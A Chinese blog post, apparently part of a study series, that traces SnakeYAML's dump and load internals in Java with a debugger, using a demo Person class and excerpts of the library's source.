+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549859994-4f958a75-8c5b-4dfc-b001-4e37198b78e7.png"></p>
+<h4 id="mInRk">奇怪的特性</h4>
+
+<p>我们需要去改写一下我们的Person类，使他内部不只有private作用域的属性</p>
+<p>改写后如下，我们加入了作用域为public和protect的属性，并且都写了这两个属性的setter与getter方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> String school;</span><br><span class="line">    <span class="keyword">protected</span> String phone;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getSchool&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setSchool&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getPhone&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(String phone)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setPhone&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们去修改一下序列化和反序列化的代码（这里就不再演示loadAs函数的使用）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sean&quot;</span>,<span class="number">18</span>,<span class="string">&quot;tyut&quot;</span>,<span class="string">&quot;13888888888&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        System.out.println(yaml.dump(person));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string1</span> <span class="operator">=</span> <span class="string">&quot;!!com.Person &#123;age: 18, name: sean, school: tyut, phone: 13888888888&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> yaml.load(string1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后，我们可以看到，<strong>在序列化和反序列化的时候，都没有调用public作用域属性的setter与getter方法</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742550978149-99d82295-b597-4b78-a8df-169f3e6e2e4e.png"></p>
+<h2 id="sM80r">序列化与反序列化断点调试</h2>
+<h3 id="YHQsV">序列化</h3>
+
+<p>进入<code>Yaml#dump</code>中，首先new了一个<code>ArrayList</code>，将传入的data放入list中，在<code>dumpAll</code>方法内，传入了一个<code>list.iterator()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">dump</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;(<span class="number">1</span>);</span><br><span class="line">        list.add(data);</span><br><span class="line">        <span class="keyword">return</span> dumpAll(list.iterator());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>list.iterator</code>仅仅是返回了一个<code>Itr</code>（迭代器），用来管理list的遍历，然后执行<code>dumpAll</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>dumpAll</code>函数中，该方法将一个Java对象转换成yaml格式的字符串（这里传参是个存在迭代器的类）</p>
+<p>这里<code>StringWriter</code>是一个用于在内存中处理字符串的东西，这里的流程就是创建一个<code>StringWriter</code>，将Java转换成的yaml格式字符串写入内存中，最后<code>buffer.toString</code>将内存中的字符串转换成一个实际的字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">dumpAll</span><span class="params">(Iterator&lt;? extends Object&gt; data)</span> &#123;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        dumpAll(data, buffer, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> buffer.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进，这里new了一个<code>Serializer</code>类（yaml序列化器，将java对象转换为yaml格式数据流）</p>
+<p>然后放入一个<code>Emitter</code>（据了解是一个yaml输出器，将data内容写入output中）</p>
+<p>然后使用迭代器遍历data，获取类里面的<code>key:value</code>键值对</p>
+<p>将键值对中的数据写入output中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpAll</span><span class="params">(Iterator&lt;? extends Object&gt; data, Writer output, Tag rootTag)</span> &#123;</span><br><span class="line">        <span class="type">Serializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Serializer</span>(<span class="keyword">new</span> <span class="title class_">Emitter</span>(output, dumperOptions), resolver,</span><br><span class="line">                dumperOptions, rootTag);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serializer.open();</span><br><span class="line">            <span class="keyword">while</span> (data.hasNext()) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representer.represent(data.next());</span><br><span class="line">                serializer.serialize(node);</span><br><span class="line">            &#125;</span><br><span class="line">            serializer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们继续跟进<code>represent</code>，主要流程肯定在该方法中的<code>representData</code>函数，我们继续跟入</p>
+<p>在<code>representData</code>中，首先data会经过一些判断，但是这些判断我们都不会进去</p>
+<p>在该方法中没有对数据进行处理，都是一些判断，最终走到<code>// check defaults</code>部分的<code>representData</code>函数中，因此核心部分还得向里面走</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BaseRepresenter#represent</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">represent</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representData(data);</span><br><span class="line">        representedObjects.clear();</span><br><span class="line">        objectToRepresent = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//BaseRepresenter#representData</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Node <span class="title function_">representData</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        objectToRepresent = data;</span><br><span class="line">        <span class="comment">// check for identity</span></span><br><span class="line">        <span class="keyword">if</span> (representedObjects.containsKey(objectToRepresent)) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representedObjects.get(objectToRepresent);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// check for null first</span></span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nullRepresenter.representData(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check the same class</span></span><br><span class="line">        Node node;</span><br><span class="line">        Class&lt;?&gt; clazz = data.getClass();</span><br><span class="line">        <span class="keyword">if</span> (representers.containsKey(clazz)) &#123;</span><br><span class="line">            <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> representers.get(clazz);</span><br><span class="line">            node = representer.representData(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// check the parents</span></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; repr : multiRepresenters.keySet()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (repr != <span class="literal">null</span> &amp;&amp; repr.isInstance(data)) &#123;</span><br><span class="line">                    <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> multiRepresenters.get(repr);</span><br><span class="line">                    node = representer.representData(data);</span><br><span class="line">                    <span class="keyword">return</span> node;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// check defaults</span></span><br><span class="line">            <span class="keyword">if</span> (multiRepresenters.containsKey(<span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> multiRepresenters.get(<span class="literal">null</span>);</span><br><span class="line">                node = representer.representData(data);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> representers.get(<span class="literal">null</span>);</span><br><span class="line">                node = representer.representData(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>RepresentJavaBean#representData</code>，我们看传入<code>representJavaBean</code>的参数</p>
+<ul>
+<li>第一个是<code>Set</code>类对象（该对象中，存放着data该类中的各个变量信息）</li>
+<li>第二个就是我们的data（javaBean）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">class</span> <span class="title class_">RepresentJavaBean</span> <span class="keyword">implements</span> <span class="title class_">Represent</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Node <span class="title function_">representData</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> representJavaBean(getProperties(data.getClass()), data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>Representer#representJavaBean</code>后，properties存放着所有的变量信息（但是在该变量中没有找到value值），而javaBean中只存放着作用域为private的属性</p>
+<p>后面比较重要的地方，应该是在for循环中，它将<code>Set</code>中的每一个<code>MethodeProperty</code>遍历出来，使用<code>property.get(javaBean)</code>去获取javaBean中与<code>MethodeProperty</code>相对应的变量</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> MappingNode <span class="title function_">representJavaBean</span><span class="params">(Set&lt;Property&gt; properties, Object javaBean)</span> &#123;</span><br><span class="line">        List&lt;NodeTuple&gt; value = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;NodeTuple&gt;(properties.size());</span><br><span class="line">        Tag tag;</span><br><span class="line">        <span class="type">Tag</span> <span class="variable">customTag</span> <span class="operator">=</span> classTags.get(javaBean.getClass());</span><br><span class="line">        tag = customTag != <span class="literal">null</span> ? customTag : <span class="keyword">new</span> <span class="title class_">Tag</span>(javaBean.getClass());</span><br><span class="line">        <span class="comment">// flow style will be chosen by BaseRepresenter</span></span><br><span class="line">        <span class="type">MappingNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingNode</span>(tag, value, FlowStyle.AUTO);</span><br><span class="line">        representedObjects.put(javaBean, node);</span><br><span class="line">        DumperOptions.<span class="type">FlowStyle</span> <span class="variable">bestStyle</span> <span class="operator">=</span> FlowStyle.FLOW;</span><br><span class="line">        <span class="keyword">for</span> (Property property : properties) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">memberValue</span> <span class="operator">=</span> property.get(javaBean);</span><br><span class="line">            <span class="type">Tag</span> <span class="variable">customPropertyTag</span> <span class="operator">=</span> memberValue == <span class="literal">null</span> ? <span class="literal">null</span></span><br><span class="line">                    : classTags.get(memberValue.getClass());</span><br><span class="line">            <span class="type">NodeTuple</span> <span class="variable">tuple</span> <span class="operator">=</span> representJavaBeanProperty(javaBean, property, memberValue,</span><br><span class="line">                    customPropertyTag);</span><br><span class="line">            <span class="keyword">if</span> (tuple == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!((ScalarNode) tuple.getKeyNode()).isPlain()) &#123;</span><br><span class="line">                bestStyle = FlowStyle.BLOCK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">nodeValue</span> <span class="operator">=</span> tuple.getValueNode();</span><br><span class="line">            <span class="keyword">if</span> (!(nodeValue <span class="keyword">instanceof</span> ScalarNode &amp;&amp; ((ScalarNode) nodeValue).isPlain())) &#123;</span><br><span class="line">                bestStyle = FlowStyle.BLOCK;</span><br><span class="line">            &#125;</span><br><span class="line">            value.add(tuple);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (defaultFlowStyle != FlowStyle.AUTO) &#123;</span><br><span class="line">            node.setFlowStyle(defaultFlowStyle);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node.setFlowStyle(bestStyle);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再进入到<code>representJavaBeanProperty</code>方法中，该方法将对象中的数据，拆解成了键值对，从返回的<code>new NodeTuple(nodeKey, nodeValue);</code>中我们也可以看出来这一点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> NodeTuple <span class="title function_">representJavaBeanProperty</span><span class="params">(Object javaBean, Property property,</span></span><br><span class="line"><span class="params">                                                  Object propertyValue, Tag customTag)</span> &#123;</span><br><span class="line">        <span class="type">ScalarNode</span> <span class="variable">nodeKey</span> <span class="operator">=</span> (ScalarNode) representData(property.getName());</span><br><span class="line">        <span class="comment">// the first occurrence of the node must keep the tag</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">hasAlias</span> <span class="operator">=</span> <span class="built_in">this</span>.representedObjects.containsKey(propertyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">Node</span> <span class="variable">nodeValue</span> <span class="operator">=</span> representData(propertyValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (propertyValue != <span class="literal">null</span> &amp;&amp; !hasAlias) &#123;</span><br><span class="line">            <span class="type">NodeId</span> <span class="variable">nodeId</span> <span class="operator">=</span> nodeValue.getNodeId();</span><br><span class="line">            <span class="keyword">if</span> (customTag == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodeId == NodeId.scalar) &#123;</span><br><span class="line">                    <span class="comment">//generic Enum requires the full tag</span></span><br><span class="line">                    <span class="keyword">if</span> (property.getType() != java.lang.Enum.class) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (propertyValue <span class="keyword">instanceof</span> Enum&lt;?&gt;) &#123;</span><br><span class="line">                            nodeValue.setTag(Tag.STR);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nodeId == NodeId.mapping) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (property.getType() == propertyValue.getClass()) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!(propertyValue <span class="keyword">instanceof</span> Map&lt;?, ?&gt;)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!nodeValue.getTag().equals(Tag.SET)) &#123;</span><br><span class="line">                                    nodeValue.setTag(Tag.MAP);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    checkGlobalTag(property, nodeValue, propertyValue);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">NodeTuple</span>(nodeKey, nodeValue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>大致的工作流程就是如上所示，最后我们的键值对会保存到 list 当中</p>
+<p>我在这里并没有找到，为什么没有调用作用域为public变量的setter方法，感觉有点乱乱的</p>
+<h3 id="LijK3">反序列化</h3>
+
+<p>走进<code>load</code>方法，这里将我们的yaml数据放入一个<code>StreamReader</code>中，并调用<code>loadFromReader</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">load</span><span class="params">(String yaml)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) loadFromReader(<span class="keyword">new</span> <span class="title class_">StreamReader</span>(yaml), Object.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面两行代码，主要是从<code>SreamReder</code>流中读取YAML数据，并将其组合成YAML结构</p>
+<p>最后<code>constructor.getSingleData(type)</code>才是将YAML数据转化为Java对象的操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">loadFromReader</span><span class="params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">        <span class="type">Composer</span> <span class="variable">composer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Composer</span>(<span class="keyword">new</span> <span class="title class_">ParserImpl</span>(sreader), resolver, loadingConfig);</span><br><span class="line">        constructor.setComposer(composer);</span><br><span class="line">        <span class="keyword">return</span> constructor.getSingleData(type);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>getSingleData</code>后，首先会创建一个Node对象（将字符串按照yaml语法转化为Node对象），然后判断type类型是否为Object，然后判断rootTag是否为空，这里我们都能跳过去，最后走到<code>constructDocument(node)</code>方法内</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleData</span><span class="params">(Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">        <span class="comment">// Ensure that the stream contains a single document and construct it</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> composer.getSingleNode();</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; !Tag.NULL.equals(node.getTag())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Object.class != type) &#123;</span><br><span class="line">                node.setTag(<span class="keyword">new</span> <span class="title class_">Tag</span>(type));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rootTag != <span class="literal">null</span>) &#123;</span><br><span class="line">                node.setTag(rootTag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> constructDocument(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Construct</span> <span class="variable">construct</span> <span class="operator">=</span> yamlConstructors.get(Tag.NULL);</span><br><span class="line">            <span class="keyword">return</span> construct.construct(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，在Node对象中，保存着我们的参数的各种属性（类型，参数名，value值）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742876145719-8e19efc5-880f-4d63-98bf-db4e39d65683.png"></p>
+<p><code>constructDocument() </code>方法的最终目的是构建一个完整的 YAML 文件，如果文件是递归结构，再进行二次处理（这里的递归结构其实就是我后面会讲的<code>[!!]</code>这个）。我们这里跟进一下 constructObject() 方法</p>
